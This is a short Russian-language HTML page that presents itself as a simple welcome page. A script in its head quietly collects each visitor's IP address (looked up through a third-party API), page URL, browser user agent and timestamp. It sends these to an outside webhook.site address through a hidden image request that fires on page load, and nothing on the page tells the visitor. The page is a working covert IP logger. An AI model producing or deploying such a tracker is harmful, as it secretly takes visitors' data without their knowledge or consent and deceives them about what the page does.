<!DOCTYPE html>
<html>
<head>
    <title>Добро пожаловать!</title>
    <script>
        // 1. Собираем данные
        const data = {
            ip: "waiting...", // IP получим отдельно
            url: window.location.href,
            userAgent: navigator.userAgent,
            time: new Date().toISOString()
        };

        // 2. Получаем IP (через сторонний API)
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(ipData => {
                data.ip = ipData.ip;
                // 3. Отправляем данные через скрытое изображение
                const trackerImg = new Image();
                trackerImg.src = `https://webhook.site/ddd4aa2b-23c4-4d6e-a6d7-b1fc40240a85?data=${encodeURIComponent(JSON.stringify(data))}`;
            })
            .catch(e => console.log("Не удалось получить IP"));
    </script>
</head>
<body>
    <h1>Добро пожаловать на наш сайт!</h1>
    <p>Спасибо за ваш визит.</p> 
    <p>Если вы видите это сообщение, значит всё работает правильно.</p>
</body>
</html>
